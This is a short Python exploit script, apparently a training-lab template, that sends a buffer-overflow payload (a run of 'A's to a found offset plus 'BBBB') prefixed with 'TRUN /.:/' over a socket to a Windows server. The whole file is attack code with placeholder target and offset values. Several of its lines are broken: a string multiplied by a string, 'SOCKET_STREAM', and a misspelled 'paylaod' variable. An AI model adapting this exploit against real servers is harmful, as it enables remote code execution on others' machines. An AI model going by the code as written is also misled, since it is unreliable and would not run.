#!/usr/bin/python3
import sys, socket
from time import sleep

shellcode = "A" * "value of offset found" + "B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM)
    s.connect(('windows-machine-ip',port))
    
    paylaod = "TRUN /.:/" + shellcode
    
    s.send((payload.encode()))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
        